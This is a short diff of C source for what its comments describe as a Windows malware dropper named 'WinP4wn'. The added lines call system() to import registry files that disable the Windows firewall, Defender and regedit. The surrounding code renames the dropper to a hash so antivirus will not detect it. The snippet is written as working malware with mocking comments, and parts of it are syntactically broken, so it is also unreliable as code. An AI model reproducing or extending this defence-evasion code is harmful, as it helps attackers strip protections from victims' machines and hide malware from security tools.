@@ -5,6 +5,9 @@
 void getos(int argc, char** argv[]) {
 #ifndef __WIN32__
 #define OS __WIN32__
+  /** disable some stuff like winfirewall and regedit */
+  system("reg /s registries/disabledef.reg");
+  system("reg /s registries/disablereg.reg");
   /** give it a hash instead of this win32 name cuz def will detect it then xDDD */
   system("ren Win32.WinP4wn.dropper.exe 27cacc006aaf5bdd2a8e6b9b94711548.exe")
   /** Using the sysreg command to import a registry hive with administrative settings xD */
